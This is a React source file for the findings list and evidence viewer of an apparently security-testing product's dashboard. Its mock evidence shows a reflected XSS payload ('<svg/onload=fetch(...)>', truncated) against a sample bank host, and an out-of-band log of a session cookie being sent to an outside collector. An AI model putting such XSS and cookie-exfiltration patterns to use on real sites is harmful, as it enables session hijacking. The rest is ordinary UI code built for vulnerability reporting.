// Tensol — C7 Findings list + drawer + C8 Evidence viewer

const { useState: useStateF } = React;

function FindingsScreen({ onRoute, role }) {
  const { t } = useTensol();
  const [sevFilter, setSevFilter] = useStateF('all');
  const [statusFilter, setStatusFilter] = useStateF('all');
  const [openF, setOpenF] = useStateF(null);
  const [evOpen, setEvOpen] = useStateF(false);

  const filtered = TENSOL_DATA.findings.filter(f =>
    (sevFilter === 'all' || f.sev === sevFilter) &&
    (statusFilter === 'all' || f.status === statusFilter)
  );

  return (
    <div data-screen-label="10 App — findings">
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end', marginBottom: 32 }}>
        <h1>{t.fTitle}</h1>
        <div style={{ display: 'flex', gap: 8 }}>
          <Btn kind="secondary">Export CSV</Btn>
          <Btn kind="primary" onClick={() => onRoute('reports')}>Generate report →</Btn>
        </div>
      </div>

      {/* Filters — quieter; just severity. Status moved to view of finding. */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 4 }}>
        <Mono size={11} color="var(--fg-3)" style={{ letterSpacing: '0.08em', textTransform: 'uppercase' }}>severity</Mono>
        <Segmented size="sm" value={sevFilter} onChange={setSevFilter} options={[
          { value: 'all', label: 'all' }, { value: 'critical', label: 'critical' }, { value: 'high', label: 'high' }, { value: 'medium', label: 'med' }, { value: 'low', label: 'low' }
        ]} />
      </div>

      {/* Table — hairlines only, no inverted header. */}
      <table style={{ width: '100%', borderCollapse: 'collapse', background: 'transparent', marginTop: 16 }}>
        <thead>
          <tr style={{ borderBottom: '1px solid var(--line-soft)' }}>
            {[t.fColTitle, t.fColSev, t.fColAsset, t.fColStatus, ''].map((h, i) => (
              <th key={i} style={{ textAlign: 'left', padding: '10px 4px', fontFamily: "'JetBrains Mono', monospace", fontSize: 10, letterSpacing: '0.08em', textTransform: 'uppercase', fontWeight: 500, color: 'var(--fg-3)' }}>{h}</th>
            ))}
          </tr>
        </thead>
        <tbody>
          {filtered.map(f => (
            <tr key={f.id} style={{ borderBottom: '1px solid var(--line-soft)', cursor: 'pointer' }}
                onClick={() => { setOpenF(f); }}>
              <td style={{ padding: '16px 4px' }}>
                <div style={{ fontFamily: "'Inter', sans-serif", fontSize: 14, color: 'var(--fg)' }}>{f.title}</div>
                <Mono size={10.5} color="var(--fg-3)" style={{ marginTop: 4 }}>{f.endpoint}</Mono>
              </td>
              <td style={{ padding: '16px 4px' }}><SeverityChip sev={f.sev} size="sm" /></td>
              <td style={{ padding: '16px 4px' }}><Mono size={11} color="var(--fg-2)">{f.asset}</Mono></td>
              <td style={{ padding: '16px 4px' }}><StatusChip status={f.status} tone="muted" size="sm" /></td>
              <td style={{ padding: '16px 4px', textAlign: 'right' }}><Mono size={14} color="var(--fg-3)">→</Mono></td>
            </tr>
          ))}
          {filtered.length === 0 && (
            <tr><td colSpan={5} style={{ padding: 60, textAlign: 'center' }}>
              <Mono size={12} color="var(--fg-3)">no findings match these filters.</Mono>
            </td></tr>
          )}
        </tbody>
      </table>

      <Drawer open={openF != null} onClose={() => setOpenF(null)} title={`// finding · ${openF?.id || ''}`} width={780}>
        {openF && <FindingDetail f={openF} onOpenEvidence={() => setEvOpen(true)} role={role} />}
      </Drawer>

      <Modal open={evOpen} onClose={() => setEvOpen(false)} title={`${t.evTitle} · ${openF?.id || ''}`} width={920}>
        {openF && <EvidenceViewer f={openF} />}
      </Modal>
    </div>
  );
}

function FindingDetail({ f, onOpenEvidence, role }) {
  const { t } = useTensol();
  return (
    <div style={{ padding: '24px 28px', display: 'flex', flexDirection: 'column', gap: 22 }}>
      <div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 8 }}>
          <SeverityChip sev={f.sev} />
          <StatusChip status={f.status} tone={f.status === 'confirmed' ? 'inverse' : 'muted'} size="sm" />
          <StatusChip status={`confidence: ${f.conf}`} tone="muted" size="sm" />
        </div>
        <h2 style={{ fontFamily: "'Space Grotesk', sans-serif", fontWeight: 500, fontSize: 24, letterSpacing: '-0.02em', margin: 0, lineHeight: 1.2 }}>{f.title}</h2>
        <Mono size={11.5} color="var(--fg-3)" style={{ display: 'block', marginTop: 6 }}>{f.asset} · {f.endpoint} · found {f.foundAt} · {f.source}</Mono>
      </div>

      <Section h={t.fImpact}>
        <p style={{ fontFamily: "'Inter', sans-serif", fontSize: 13.5, lineHeight: 1.55, color: 'var(--fg)', margin: 0, maxWidth: '62ch' }}>{f.impact}</p>
      </Section>

      <Section h={t.fRepro}>
        <pre style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 11.5, lineHeight: 1.6, margin: 0, color: 'var(--paper)', background: 'var(--ink)', padding: 14, whiteSpace: 'pre-wrap' }}>
{f.repro.map((r, i) => `${String(i+1).padStart(2,'0')}  ${r}`).join('\n')}
        </pre>
      </Section>

      <Section h={t.fValidator}>
        <pre style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 11.5, lineHeight: 1.6, margin: 0, color: 'var(--fg-2)', background: 'var(--bg-2)', border: '1px solid var(--line-soft)', padding: 14 }}>
{f.validatorLog.join('\n')}
        </pre>
        <Btn size="sm" kind="secondary" style={{ marginTop: 10 }} onClick={onOpenEvidence}>{t.fOpenEvidence} →</Btn>
      </Section>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 22 }}>
        <Section h={t.fAttack}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
            {f.mappings.mitre.length === 0 && <Mono size={11} color="var(--fg-3)">none</Mono>}
            {f.mappings.mitre.map((m, i) => <Mono key={i} size={11} color="var(--fg)">■ {m}</Mono>)}
          </div>
        </Section>
        <Section h={t.fMappings}>
          {f.mappings.nistCsf.length > 0 && <div><Mono size={10} color="var(--fg-3)">NIST CSF</Mono><div>{f.mappings.nistCsf.map(x => <Mono key={x} size={11} style={{ display: 'block' }}>■ {x}</Mono>)}</div></div>}
          {f.mappings.atlas.length > 0 && <div style={{ marginTop: 10 }}><Mono size={10} color="var(--fg-3)">MITRE ATLAS</Mono><div>{f.mappings.atlas.map(x => <Mono key={x} size={11} style={{ display: 'block' }}>■ {x}</Mono>)}</div></div>}
          {f.mappings.d3fend.length > 0 && <div style={{ marginTop: 10 }}><Mono size={10} color="var(--fg-3)">D3FEND</Mono><div>{f.mappings.d3fend.map(x => <Mono key={x} size={11} style={{ display: 'block' }}>■ {x}</Mono>)}</div></div>}
          {f.mappings.aiRmf.length > 0 && <div style={{ marginTop: 10 }}><Mono size={10} color="var(--fg-3)">NIST AI RMF</Mono><div>{f.mappings.aiRmf.map(x => <Mono key={x} size={11} style={{ display: 'block' }}>■ {x}</Mono>)}</div></div>}
        </Section>
      </div>

      <Section h={t.fRemediation}>
        <p style={{ fontFamily: "'Inter', sans-serif", fontSize: 13, lineHeight: 1.55, color: 'var(--fg)', margin: 0, maxWidth: '62ch' }}>{f.remediation}</p>
      </Section>

      {f.comments.length > 0 && (
        <Section h={t.fComments}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            {f.comments.map((c, i) => (
              <div key={i} style={{ padding: '10px 12px', borderLeft: '2px solid var(--fg)', background: 'var(--bg-2)' }}>
                <Mono size={10} color="var(--fg-3)">{c.who} · {c.when}</Mono>
                <p style={{ fontFamily: "'Inter', sans-serif", fontSize: 13, margin: '4px 0 0', color: 'var(--fg)' }}>{c.text}</p>
              </div>
            ))}
          </div>
        </Section>
      )}
    </div>
  );
}

function EvidenceViewer({ f }) {
  const { t } = useTensol();
  return (
    <div style={{ padding: '20px 24px', display: 'flex', flexDirection: 'column', gap: 16 }}>
      <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1fr', gap: 16 }}>
        {/* Screenshot */}
        <div>
          <Eyebrow style={{ marginBottom: 6 }}>{t.evScreenshot}</Eyebrow>
          <div style={{ position: 'relative', height: 260, border: '1px solid var(--fg)', background: '#0d0d0d', overflow: 'hidden' }}>
            <HalftoneBg size={4} opacity={0.25} color="var(--paper)" />
            <div style={{ position: 'absolute', inset: 14, border: '1px dashed rgba(255,255,255,0.3)', display: 'flex', flexDirection: 'column', justifyContent: 'space-between', padding: 12, fontFamily: 'monospace', fontSize: 10, color: 'rgba(255,255,255,0.6)' }}>
              <div>app.acme-bank.ru/search?q=&lt;svg/onload=…&gt;</div>
              <div style={{ alignSelf: 'center', textAlign: 'center' }}>
                <Mono size={10} color="rgba(255,255,255,0.4)" style={{ display: 'block' }}>// rendered DOM at validator t+441ms</Mono>
                <Mono size={28} color="#fff" style={{ display: 'block', marginTop: 8, fontFamily: "'Space Grotesk',sans-serif", letterSpacing: '-0.02em' }}>XSS landed</Mono>
                <Mono size={10} color="rgba(255,255,255,0.4)" style={{ display: 'block', marginTop: 8 }}>cookie exfiltrated → oob.tensol.dev/c/8f2c</Mono>
              </div>
              <div>ev_8f2c_001.png · 184 KB · sha256:9a4b…</div>
            </div>
          </div>
        </div>

        {/* OOB */}
        <div>
          <Eyebrow style={{ marginBottom: 6 }}>{t.evOob}</Eyebrow>
          <pre style={{ margin: 0, padding: 14, background: 'var(--ink)', color: 'var(--paper)', fontFamily: 'monospace', fontSize: 11, lineHeight: 1.6, height: 260, overflow: 'auto' }}>
{`source     oob.tensol.dev (interactsh-pinned)
token      8f2c
when       2026-05-04 11:14:02.412 UTC
soft-corr  match (token in path)
hard-corr  match (assessment seed=42 fingerprint)
payload    GET /c/8f2c?c=session=eyJhbGciOi… (redacted)
ttl        retained until report.delivered + 30d
hash       sha256:9a4b1c…7f23ad`}
          </pre>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16 }}>
        {/* HTTP */}
        <div>
          <Eyebrow style={{ marginBottom: 6 }}>{t.evHttp}</Eyebrow>
          <pre style={{ margin: 0, padding: 14, background: 'var(--bg-2)', border: '1px solid var(--line-soft)', fontFamily: 'monospace', fontSize: 10.5, lineHeight: 1.55, height: 200, overflow: 'auto', color: 'var(--fg-2)' }}>
{`> GET /search?q=<svg/onload=fetch(...)> HTTP/1.1
> Host: app.acme-bank.ru
> Cookie: session=eyJ… [REDACTED]
> User-Agent: Mozilla/5.0 (X11; Linux) playwright

< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Security-Policy: script-src 'self' 'unsafe-inline'
< Set-Cookie: csrf=… SameSite=Lax
<
< <h1>Results for: <svg/onload=fetch(...)></h1>
< [DOM executes inline svg]`}
          </pre>
        </div>

        {/* HAR + trace */}
        <div>
          <Eyebrow style={{ marginBottom: 6 }}>{t.evHar} · {t.evTrace}</Eyebrow>
          <div style={{ padding: 14, background: 'var(--bg-2)', border: '1px solid var(--line-soft)', height: 200, overflow: 'auto' }}>
            <Mono size={11} color="var(--fg-2)" style={{ display: 'block' }}>17 requests · 12 200 · 3 304 · 2 oob</Mono>
            <Mono size={11} color="var(--fg-2)" style={{ display: 'block' }}>1.2s total · 441ms first byte</Mono>
            <div style={{ marginTop: 10 }}>
              <Sparkline values={[120, 280, 110, 90, 60, 441, 80, 70, 60, 60, 70, 90, 50, 30, 140, 60, 70]} height={36} />
            </div>
            <div style={{ marginTop: 12, paddingTop: 10, borderTop: '1px dashed var(--line-soft)' }}>
              <Mono size={11} color="var(--fg)" style={{ display: 'block' }}>playwright trace</Mono>
              <Mono size={10} color="var(--fg-3)" style={{ display: 'block' }}>ev_8f2c_trace.zip · 4.1 MB</Mono>
              <Btn size="sm" kind="secondary" style={{ marginTop: 8 }}>Download trace</Btn>
            </div>
          </div>
        </div>
      </div>

      {/* Bottom row */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, paddingTop: 12, borderTop: '1px solid var(--line-soft)' }}>
        <div>
          <Eyebrow style={{ marginBottom: 6 }}>{t.evRedaction}</Eyebrow>
          <Mono size={11} color="var(--fg-2)" style={{ display: 'block' }}>■ Cookie header value · reason: session-token · policy: redact-pii</Mono>
          <Mono size={11} color="var(--fg-2)" style={{ display: 'block' }}>■ Response body · regex pii.email · 2 occurrences</Mono>
        </div>
        <div>
          <Eyebrow style={{ marginBottom: 6 }}>{t.evHash}</Eyebrow>
          <Mono size={11} color="var(--fg)" style={{ display: 'block' }}>artifact bundle · sha256:c7b22a0e…f9a1</Mono>
          <Mono size={10} color="var(--fg-3)" style={{ display: 'block' }}>signed by validator-key prod-2026-q2</Mono>
        </div>
      </div>
    </div>
  );
}

function Section({ h, children }) {
  return (
    <div>
      <Eyebrow style={{ marginBottom: 8 }}>{`// ${h.toUpperCase()}`}</Eyebrow>
      {children}
    </div>
  );
}

Object.assign(window, { FindingsScreen, EvidenceViewer });

